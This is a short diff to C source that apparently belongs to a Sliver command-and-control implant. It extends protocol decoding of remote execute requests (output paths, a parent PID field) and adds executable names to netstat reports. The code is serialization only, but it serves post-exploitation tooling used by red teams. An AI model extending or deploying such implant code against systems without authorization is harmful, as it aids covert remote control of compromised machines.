@@ -870,12 +870,26 @@ int sliver_execute_req_decode(const void *data, size_t len, sliver_execute_req_t
         return -1;
       }
       out->output = v != 0;
+    } else if (field == 4 && wire == 2) {
+      if (sliver_reader_string(&r, out->stdout_path, sizeof(out->stdout_path)) != 0) {
+        return -1;
+      }
+    } else if (field == 5 && wire == 2) {
+      if (sliver_reader_string(&r, out->stderr_path, sizeof(out->stderr_path)) != 0) {
+        return -1;
+      }
     } else if (field == 8 && wire == 0) {
       uint64_t v;
       if (sliver_reader_varint(&r, &v) != 0) {
         return -1;
       }
       out->background = v != 0;
+    } else if (field == 10 && wire == 0) {
+      uint64_t v;
+      if (sliver_reader_varint(&r, &v) != 0) {
+        return -1;
+      }
+      out->ppid = (int32_t)v;
     } else if (sliver_reader_skip(&r, wire) != 0) {
       return -1;
     }
@@ -1275,10 +1289,11 @@ int sliver_netstat_encode(sliver_buf_t *out, const sliver_sock_t *entries, int c
       sliver_buf_free(&entry);
       return -1;
     }
-    /* Process{Pid=1, Executable=3}: only the pid is known cheaply here. */
+    /* Process{Pid=1, Executable=3}. */
     if (e->pid > 0) {
       sliver_buf_init(&proc);
-      if (sliver_buf_put_int32(&proc, 1, e->pid) != 0) {
+      if (sliver_buf_put_int32(&proc, 1, e->pid) != 0 ||
+          (e->exe[0] != '\0' && sliver_buf_put_string(&proc, 3, e->exe) != 0)) {
         sliver_buf_free(&proc);
         sliver_buf_free(&entry);
         return -1;
